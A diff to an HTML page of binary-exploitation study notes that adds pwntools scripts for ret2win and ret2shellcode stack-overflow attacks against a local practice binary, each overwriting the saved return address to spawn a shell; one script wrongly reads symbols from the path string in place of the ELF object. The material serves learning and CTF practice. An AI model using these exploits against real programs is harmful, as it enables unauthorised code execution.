@@ -105,6 +105,7 @@ int main(void){
     <ul>
       <li>Function call:
         <ol>
+          <li><code>call foo</code>: same as <code>push rip+5; jmp [foo]</code>, <code>rip+5</code> because a call instruction is 5 bytes</li>
           <li><code>push   rbp</code>: previous <code>rbp</code> is saved to the stack</li>
           <li><code>mov    rbp,rsp</code>: set previous <code>rbp</code> to current <code>rsp</code></li>
           <li><code>sub    rsp,0x10</code>: make room for 3 local variables on the stack (<code>sub</code> because the stack grow down)</li>
@@ -145,14 +146,6 @@ int main(void){
 
     <hr>
     <h2 id="buffer-overflow">Buffer Overflow</h2>
-    <ul>
-      <li><u>Exploits</u>:
-        <ol>
-          <li>Overwrite return address to hijack control flow</li>
-          <li>Overwrite stack variables to cause a jump to unintented locations</li>
-        </ol>
-      </li>
-    </ul>
     <h3 id="vulnerable-functions">Vulnerable Functions</h3>
     <table>
       <thead>
@@ -229,6 +222,88 @@ print(f"RIP of crashed program: {hex(p.corefile.rip)}")</code></pre>
             data-output="2-3"><code class="language-bash">python3 poc.py
 Cyclic crashed at 0x616161706161616f
 RIP of crashed program: 0xdeadbeef</code></pre>
+
+  <hr>
+  <h2 id="stack-exploits">Exploits</h2>
+  <h3 id="ret2win">ret2win</h3>
+  When to use: 
+  <ul >
+      <li>&#9989; ELF contains a <code>win()</code> function</li>
+      <li>&#9989; NX Enabled</li>
+      <li>&#10060; No Canary</li>
+      <li>&#10060; No PIE</li>
+      <li>&#9989; ability to overwrite return address</li>
+  </ul>
+  Example:
+  <pre><code class="language-py">#!/usr/bin/python3
+from pwn import *
+import warnings
+import os
+warnings.filterwarnings('ignore')
+context.arch = 'amd64'
+context.log_level = 'critical'
+
+binary = "./vulnerable"
+elf = ELF(binary)
+
+# address of win function we want to call
+# the win function will spawn a root shell
+# note: needs to be No PIE
+win_addr = binary.symbols.win
+
+# example where the stack is 0x20 big
+payload = flat([
+    b'A'*0x20,    # overwrite stack with 'A'
+    b'B'*0x8,     # overwrite the saved rbp with 'B'
+    win_addr      # overwrite the saved rip with the win addr
+], word_size=64)
+
+with process(binary) as r:
+    r.send(payload)
+    print("Starting shell")
+    r.interactive()</code></pre>
+    <br><br>
+  <h3 id="shellcode">ret2shellcode</h3>
+  When to use: 
+  <ul >
+      <li>&#10060; NX Disabled</li>
+      <li>&#10060; No Canary</li>
+      <li>&#10060; No PIE</li>
+      <li>&#9989; ability to overwrite return address</li>
+  </ul>
+  Example:
+  <pre><code class="language-py">#!/usr/bin/python3
+from pwn import *
+import warnings
+import os
+warnings.filterwarnings('ignore')
+context.arch = 'amd64'
+context.log_level = 'critical'
+
+binary = "./vulnerable"
+elf = ELF(binary)
+
+# pwntools shellcode to spawn a shell
+shellcode = asm(shellcraft.sh())
+
+with process(binary) as r:
+    # if ASLR is enabled we need a leak
+    r.readuntil("&buff leak: ")
+    leak = p64(int(r.readline().strip(), 16))
+
+    # example where the stack is 0x50 big
+    padding_size = 0x50 - len(shellcode)
+    payload = flat([
+        shellcode,          # shellcode at the start of the buffer
+        b'A'*padding_size,  # overwrite rest of stack with 'A'
+        b'B'*0x8,           # overwrite the saved rbp with 'B'
+        leak                # overwrite the saved rip with the buff addr
+    ], word_size=64)
+
+    r.send(payload)
+    print("Starting shell")
+    r.interactive()</code></pre>
+
 </body>
 
 </body>
